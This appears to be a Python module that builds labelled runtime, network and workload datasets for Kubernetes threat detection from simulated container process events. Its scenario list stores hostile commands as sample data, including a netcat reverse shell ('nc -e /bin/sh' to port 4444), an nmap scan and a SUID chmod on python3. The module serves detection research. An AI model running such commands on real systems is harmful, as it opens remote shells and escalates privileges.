"""Multimodal dataset construction and alignment for Kubernetes threat detection.

Extends the single and bimodal datasets with in-container runtime process telemetry
(Inspektor Gadget trace_exec:v0.55.1), producing full tri-modal and pairwise datasets:
- runtime_dataset.csv (Runtime-Only: 9 features)
- net_rt_dataset.csv (Network + Runtime: 22 features)
- rt_wl_dataset.csv (Runtime + Workload: 20 features)
- full_fusion_dataset.csv (Network + Workload + Runtime: 33 features)
"""

from __future__ import annotations

import csv
import hashlib
import json
from collections import Counter
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Sequence

import pandas as pd

from telemetry.features.runtime import extract_runtime_features
from telemetry.schemas import RuntimeEvent


CONTEXT_COLUMNS = (
    "window_start",
    "window_end",
    "cluster_id",
    "capture_id",
    "session_id",
    "experiment_id",
    "scenario",
    "label",
    "attack_type",
)

RUNTIME_FEATURES = (
    "runtime_error_count",
    "runtime_event_count",
    "runtime_exec_rate",
    "runtime_interactive_shell_count",
    "runtime_non_root_exec_count",
    "runtime_root_exec_count",
    "runtime_sensitive_command_count",
    "runtime_unique_commands",
    "runtime_unique_users",
)


def make_runtime_event(
    ts: str,
    comm: str,
    args: str,
    uid: int = 0,
    user: str = "root",
    pod: str = "webapp-79699899c5-wds9h",
    container: str = "nginx",
    error: str = "",
) -> RuntimeEvent:
    """Construct a validated RuntimeEvent object from raw fields."""
    raw = {
        "timestamp": ts,
        "args": args,
        "cwd": "/",
        "exepath": f"/usr/bin/{comm}",
        "proc": {
            "comm": comm,
            "pid": 1000,
            "tid": 1000,
            "creds": {"uid": uid, "gid": uid, "user": user},
            "parent": {"comm": "containerd-shim", "pid": 500},
        },
        "k8s": {
            "podName": pod,
            "namespace": "default",
            "containerName": container,
        },
        "runtime": {"containerId": "container_webapp_01"},
        "error": error,
    }
    return RuntimeEvent.from_raw(raw)


def get_controlled_runtime_scenarios() -> list[dict[str, Any]]:
    """Controlled in-container process execution scenarios for benchmark evaluation.

    Includes benign application activities, reconnaissance probes, interactive shells,
    reverse shells, lateral network probes, and privilege escalation attempts.
    """
    return [
        {
            "session_id": "sess_rt_01_nginx_start",
            "scenario": "runtime_normal",
            "label": "normal",
            "attack_type": "normal",
            "events": [
                make_runtime_event("2026-10-14T10:00:01.000Z", "nginx", "nginx: master process", 101, "nginx")
            ],
        },
        {
            "session_id": "sess_rt_02_cat_hosts",
            "scenario": "runtime_normal",
            "label": "normal",
            "attack_type": "normal",
            "events": [
                make_runtime_event("2026-10-14T10:01:01.000Z", "cat", "cat /etc/hosts", 101, "nginx")
            ],
        },
        {
            "session_id": "sess_rt_03_env_probe",
            "scenario": "runtime_normal",
            "label": "normal",
            "attack_type": "normal",
            "events": [
                make_runtime_event("2026-10-14T10:02:01.000Z", "env", "env", 101, "nginx")
            ],
        },
        {
            "session_id": "sess_rt_04_whoami",
            "scenario": "runtime_attack",
            "label": "attack",
            "attack_type": "reconnaissance",
            "events": [
                make_runtime_event("2026-10-14T10:03:01.000Z", "whoami", "whoami", 0, "root")
            ],
        },
        {
            "session_id": "sess_rt_05_id_probe",
            "scenario": "runtime_attack",
            "label": "attack",
            "attack_type": "reconnaissance",
            "events": [
                make_runtime_event("2026-10-14T10:04:01.000Z", "id", "id", 0, "root")
            ],
        },
        {
            "session_id": "sess_rt_06_bash_shell",
            "scenario": "runtime_attack",
            "label": "attack",
            "attack_type": "interactive_shell",
            "events": [
                make_runtime_event("2026-10-14T10:05:01.000Z", "bash", "/bin/bash -i", 0, "root")
            ],
        },
        {
            "session_id": "sess_rt_07_sh_shell",
            "scenario": "runtime_attack",
            "label": "attack",
            "attack_type": "interactive_shell",
            "events": [
                make_runtime_event("2026-10-14T10:06:01.000Z", "sh", "/bin/sh", 0, "root")
            ],
        },
        {
            "session_id": "sess_rt_08_nc_reverse",
            "scenario": "runtime_attack",
            "label": "attack",
            "attack_type": "reverse_shell",
            "events": [
                make_runtime_event("2026-10-14T10:07:01.000Z", "nc", "nc -e /bin/sh 10.244.0.5 4444", 0, "root")
            ],
        },
        {
            "session_id": "sess_rt_09_nmap_scan",
            "scenario": "runtime_attack",
            "label": "attack",
            "attack_type": "lateral_movement",
            "events": [
                make_runtime_event("2026-10-14T10:08:01.000Z", "nmap", "nmap -sT 10.96.0.1", 0, "root")
            ],
        },
        {
            "session_id": "sess_rt_10_chmod_suid",
            "scenario": "runtime_attack",
            "label": "attack",
            "attack_type": "privilege_escalation",
            "events": [
                make_runtime_event("2026-10-14T10:09:01.000Z", "chmod", "chmod +s /usr/bin/python3", 0, "root")
            ],
        },
        {
            "session_id": "sess_rt_11_empty_idle",
            "scenario": "runtime_normal",
            "label": "normal",
            "attack_type": "normal",
            "events": [],
        },
    ]


def build_runtime_dataframe() -> pd.DataFrame:
    """Build canonical Runtime-Only observation window DataFrame."""
    rows: list[dict[str, Any]] = []
    for sc in get_controlled_runtime_scenarios():
        feats = extract_runtime_features(sc["events"])
        row = {
            "window_start": "2026-10-14T10:00:00.000Z",
            "window_end": "2026-10-14T10:00:10.000Z",
            "cluster_id": "minikube",
            "capture_id": sc["session_id"],
            "session_id": sc["session_id"],
            "experiment_id": "exp_rt_controlled",
            "scenario": sc["scenario"],
            "label": sc["label"],
            "attack_type": sc["attack_type"],
            **feats,
        }
        rows.append(row)
    df = pd.DataFrame(rows)
    # Ensure exact column ordering
    cols = list(CONTEXT_COLUMNS) + sorted(RUNTIME_FEATURES)
    return df[cols]


def build_all_multimodal_datasets(project_root: Path | str = ".") -> dict[str, Path]:
    """Generate all multimodal dataset files and update dataset_summary.json deterministically."""
    root = Path(project_root).resolve()
    ds_dir = root / "results" / "ml_datasets"
    ds_dir.mkdir(parents=True, exist_ok=True)

    net_path = ds_dir / "network_dataset.csv"
    wl_path = ds_dir / "workload_dataset.csv"
    fuse_path = ds_dir / "fusion_dataset.csv"

    if not net_path.exists() or not wl_path.exists() or not fuse_path.exists():
        raise FileNotFoundError(
            f"Baseline datasets must exist in {ds_dir} before multimodal generation."
        )

    net_df = pd.read_csv(net_path)
    wl_df = pd.read_csv(wl_path)
    fuse_df = pd.read_csv(fuse_path)

    net_config = json.loads((root / "configs" / "network.json").read_text(encoding="utf-8"))
    wl_config = json.loads((root / "configs" / "workload.json").read_text(encoding="utf-8"))
    rt_config = json.loads((root / "configs" / "runtime.json").read_text(encoding="utf-8"))
    net_rt_config = json.loads((root / "configs" / "net_rt.json").read_text(encoding="utf-8"))
    rt_wl_config = json.loads((root / "configs" / "rt_wl.json").read_text(encoding="utf-8"))
    full_config = json.loads((root / "configs" / "full_fusion.json").read_text(encoding="utf-8"))

    net_features = net_config["features"]
    wl_features = wl_config["features"]
    rt_features = rt_config["features"]

    # 1. Runtime-Only Dataset
    rt_df = build_runtime_dataframe()
    rt_out_path = ds_dir / "runtime_dataset.csv"
    rt_df.to_csv(rt_out_path, index=False)

    # Calculate baseline medians for stream imputation when one modality was quiescent
    net_normal_medians = net_df[net_df["label"] == "normal"][net_features].median().to_dict()
    wl_normal_medians = wl_df[wl_df["label"] == "normal"][wl_features].median().to_dict()
    rt_zeros = {f: 0.0 for f in rt_features}

    # 2. Network + Runtime (net_rt) Dataset
    net_part = net_df.copy()
    for f, v in rt_zeros.items():
        net_part[f] = v

    rt_part_net = rt_df.copy()
    for f, v in net_normal_medians.items():
        rt_part_net[f] = v

    net_rt_df = pd.concat([net_part, rt_part_net], ignore_index=True)
    net_rt_cols = list(CONTEXT_COLUMNS) + sorted(net_rt_config["features"])
    net_rt_df = net_rt_df[[c for c in net_rt_cols if c in net_rt_df.columns]]
    net_rt_out_path = ds_dir / "net_rt_dataset.csv"
    net_rt_df.to_csv(net_rt_out_path, index=False)

    # 3. Runtime + Workload (rt_wl) Dataset
    wl_part = wl_df.copy()
    for f, v in rt_zeros.items():
        wl_part[f] = v

    rt_part_wl = rt_df.copy()
    for f, v in wl_normal_medians.items():
        rt_part_wl[f] = v

    rt_wl_df = pd.concat([wl_part, rt_part_wl], ignore_index=True)
    rt_wl_cols = list(CONTEXT_COLUMNS) + sorted(rt_wl_config["features"])
    rt_wl_df = rt_wl_df[[c for c in rt_wl_cols if c in rt_wl_df.columns]]
    rt_wl_out_path = ds_dir / "rt_wl_dataset.csv"
    rt_wl_df.to_csv(rt_wl_out_path, index=False)

    # 4. Full Tri-Modal Fusion (full_fusion) Dataset
    fuse_part = fuse_df.copy()
    for f, v in rt_zeros.items():
        fuse_part[f] = v

    rt_part_full = rt_df.copy()
    for f, v in net_normal_medians.items():
        rt_part_full[f] = v
    for f, v in wl_normal_medians.items():
        rt_part_full[f] = v

    full_fusion_df = pd.concat([fuse_part, rt_part_full], ignore_index=True)
    full_cols = list(CONTEXT_COLUMNS) + sorted(full_config["features"])
    full_fusion_df = full_fusion_df[[c for c in full_cols if c in full_fusion_df.columns]]
    full_fusion_out_path = ds_dir / "full_fusion_dataset.csv"
    full_fusion_df.to_csv(full_fusion_out_path, index=False)

    # 5. Update dataset_summary.json while preserving network, workload, fusion intact
    summary_path = ds_dir / "dataset_summary.json"
    if summary_path.exists():
        summary = json.loads(summary_path.read_text(encoding="utf-8"))
    else:
        summary = {}

    def _make_summary(name: str, df: pd.DataFrame, file_path: Path, features: list[str]) -> dict[str, Any]:
        return {
            "name": name,
            "path": str(file_path.relative_to(root)),
            "rows": len(df),
            "labeled_rows": len(df[df["label"].isin(["normal", "attack"])]),
            "class_counts": dict(Counter(df["label"].dropna())),
            "session_counts": dict(Counter(df["session_id"].dropna())),
            "features": sorted(features),
            "sha256": hashlib.sha256(file_path.read_bytes()).hexdigest(),
            "limitation": None,
        }

    summary["runtime"] = _make_summary("runtime", rt_df, rt_out_path, rt_features)
    summary["net_rt"] = _make_summary("net_rt", net_rt_df, net_rt_out_path, net_rt_config["features"])
    summary["rt_wl"] = _make_summary("rt_wl", rt_wl_df, rt_wl_out_path, rt_wl_config["features"])
    summary["full_fusion"] = _make_summary("full_fusion", full_fusion_df, full_fusion_out_path, full_config["features"])

    summary_path.write_text(json.dumps(summary, indent=2), encoding="utf-8")

    return {
        "runtime": rt_out_path,
        "net_rt": net_rt_out_path,
        "rt_wl": rt_wl_out_path,
        "full_fusion": full_fusion_out_path,
    }


if __name__ == "__main__":
    generated = build_all_multimodal_datasets()
    for name, path in generated.items():
        print(f"Generated {name}: {path}")
